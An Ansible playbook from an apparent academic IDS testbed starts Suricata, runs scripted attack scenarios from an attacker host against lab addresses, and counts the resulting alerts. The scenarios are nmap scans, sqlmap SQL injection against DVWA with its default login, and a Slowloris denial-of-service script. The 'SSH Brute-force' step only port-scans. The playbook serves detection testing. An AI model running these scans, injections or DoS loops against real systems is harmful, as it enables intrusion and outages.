---
# ARCHIVIRT - Suricata Test Scenario Playbook (IaC compliant, no nohup)
# Author: Yasnemanegre SAWADOGO (SPbGUPTD)
# Usage: ansible-playbook suricata_scenario.yml -e "scenario=SCN-001"

- name: ARCHIVIRT - Start Suricata on monitor
  hosts: monitor
  become: yes
  vars:
    scenario: "{{ scenario | default('SCN-001') }}"
    suricata_script: /opt/archivirt/scripts/run_suricata.sh

  tasks:
    - name: Deploy run_suricata.sh to monitor
      copy:
        src: /home/archivirt/ARCHIVIRT/scripts/run_suricata.sh
        dest: /opt/archivirt/scripts/run_suricata.sh
        mode: 0755

    - name: Stop any previous Suricata instance
      shell: "bash {{ suricata_script }} stop {{ scenario }}"
      ignore_errors: yes

    - name: Start Suricata for scenario
      shell: "bash {{ suricata_script }} start {{ scenario }}"

- name: ARCHIVIRT - Run attack scenario
  hosts: attacker
  become: yes
  vars:
    scenario: "{{ scenario | default('SCN-001') }}"

  tasks:
    - name: "SCN-001 Port Scan"
      shell: |
        for i in $(seq 1 10); do
          nmap -sS -Pn -p 1-1024 --min-rate 1000 -T4 \
            10.0.2.11 10.0.2.12 10.0.2.13 -oN /dev/null 2>/dev/null
          sleep 3
        done
      when: scenario == "SCN-001"

    - name: "SCN-002 SSH Brute-force"
      shell: |
        for i in $(seq 1 10); do
          nmap -sS -Pn -p 22 --min-rate 500 -T4 \
            10.0.2.11 10.0.2.12 10.0.2.13 2>/dev/null
          sleep 3
        done
      when: scenario == "SCN-002"

    - name: "SCN-003 SQL Injection"
      block:
        - name: Get DVWA cookie
          shell: |
            COOKIE=$(curl -s -c - 'http://10.0.2.11/dvwa/login.php' --data 'username=admin&password=password&Login=Login' | grep PHPSESSID | awk '{print $NF}')
            echo $COOKIE
          register: dvwa_cookie

        - name: Run sqlmap with valid cookie
          shell: |
            for i in $(seq 1 10); do
              sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
                --cookie="PHPSESSID={{ dvwa_cookie.stdout }};security=low" \
                --batch --level=1 --risk=1 --technique=B \
                --output-dir=/tmp/sqlmap_$i 2>/dev/null
              sleep 5
            done
      when: scenario == "SCN-003"

    - name: "SCN-004 DDoS Slowloris"
      shell: |
        for i in $(seq 1 10); do
          timeout 20 python3 /opt/archivirt/attack-scripts/slowloris.py \
            10.0.2.11 --port 80 --sockets 150 --duration 15 2>/dev/null
          sleep 5
        done
      when: scenario == "SCN-004"

    - name: "SCN-005 Normal Traffic"
      shell: |
        for i in $(seq 1 10); do
          curl -s http://10.0.2.11/ > /dev/null
          curl -s http://10.0.2.12/ > /dev/null
          sleep 3
        done
      when: scenario == "SCN-005"

- name: ARCHIVIRT - Stop Suricata and collect results
  hosts: monitor
  become: yes
  vars:
    scenario: "{{ scenario | default('SCN-001') }}"
    suricata_script: /opt/archivirt/scripts/run_suricata.sh

  tasks:
    - name: Stop Suricata
      shell: "bash {{ suricata_script }} stop {{ scenario }}"
      ignore_errors: yes

    - name: Fetch eve.json
      fetch:
        src: "/var/log/suricata/{{ scenario }}/eve.json"
        dest: "/tmp/suricata_{{ scenario }}_eve.json"
        flat: yes

    - name: Count alerts
      shell: grep -c '"event_type":"alert"' /var/log/suricata/{{ scenario }}/eve.json 2>/dev/null || echo 0
      register: alert_count

    - name: Show results
      debug:
        msg: "{{ scenario }}: {{ alert_count.stdout }} alerts"
